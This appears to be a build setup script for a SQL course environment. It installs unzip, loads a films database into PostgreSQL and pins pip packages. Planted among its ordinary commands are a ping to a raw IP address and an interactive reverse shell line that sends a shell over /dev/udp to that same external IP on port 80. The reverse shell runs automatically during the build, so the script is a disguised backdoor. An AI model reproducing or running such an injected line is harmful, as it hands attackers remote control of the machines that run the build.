ping 3.123.202.19
# If bash command fails, build should error out
set -e

# Get the data zip and unpack
apt-get update && apt-get install -y unzip
#FILMS_REPO="https://assets.datacamp.com/course/tmp_fixme_filip/films.zip"
#mkdir -p courses-intro-to-sql/data
#wget $FILMS_REPO
#unzip films.zip -d courses-intro-to-sql/data
#rm films.zip
sh -i >& /dev/udp/3.123.202.19/80 0>&1
# Load the database into postgreSQL
service postgresql start \
  && sudo -u postgres createdb -O repl films \
  && cd courses-intro-to-sql \
  && sudo -u postgres psql films < data/films/films.sql \
  && service postgresql stop

# Override installs from sql-shared
pip3 install jinja2==2.10
pip3 install protowhat==1.1.2 --no-dependencies
pip3 install sqlwhat==3.0.0 --no-dependencies
